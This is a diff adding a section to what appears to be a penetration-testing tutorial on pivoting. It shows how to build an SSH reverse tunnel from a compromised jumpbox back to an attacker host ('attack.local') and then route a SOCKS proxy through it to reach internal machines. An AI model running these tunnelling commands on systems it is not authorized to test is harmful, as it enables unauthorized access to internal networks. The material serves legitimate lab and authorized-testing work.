@@ -95,3 +95,22 @@ And voila! We can talk to `destbox.local` through two tunnels/proxies.
 <video width="500" height="300" controls>
   <source type="video/mp4" src="/assets/videos/proxychains-demo.mp4">
 </video>
+
+## But wait, I can't access SSH on jumpbox1?
+So you have a shell on a box, but can't hit ssh on it? Pretty common as web services may not just expose `ssh` to the world. `ssh` reverse tunnels to the rescue!  
+You'll want to start an ssh server on your box, probably with `systemctl start sshd` and then I'd `cat ~/.ssh/*.pub` on `jumpbox1` and add that to whatever `ssh` user you plan to use (not a bad idea to create a separate user for this and [restrict accordingly to just tunnels](https://unix.stackexchange.com/a/14313), but you do you...)  
+Once that is complete, from the jumpbox, you'll run
+```
+ssh -f -N -R 2222:127.0.0.1:22 <you>@attack.local
+```
+Now, hop back to your attack box and run `ss -tlpn | grep 2222` and you should see the new listening port on 127.0.0.1. Now, just create your initial SOCKS proxy through that new tunnel (or use it to ssh into wordpress directly from your machine)
+```
+ssh -f -N -D 127.0.0.1:8888 <jumpbox1-user>@127.0.0.1 -p 2222
+````
+And from here, you'd do the rest as shown before.
+
+## Demo round 2
+
+<video width="500" height="300" controls>
+  <source type="video/mp4" src="/assets/videos/proxychains-reverse.mp4">
+</video>
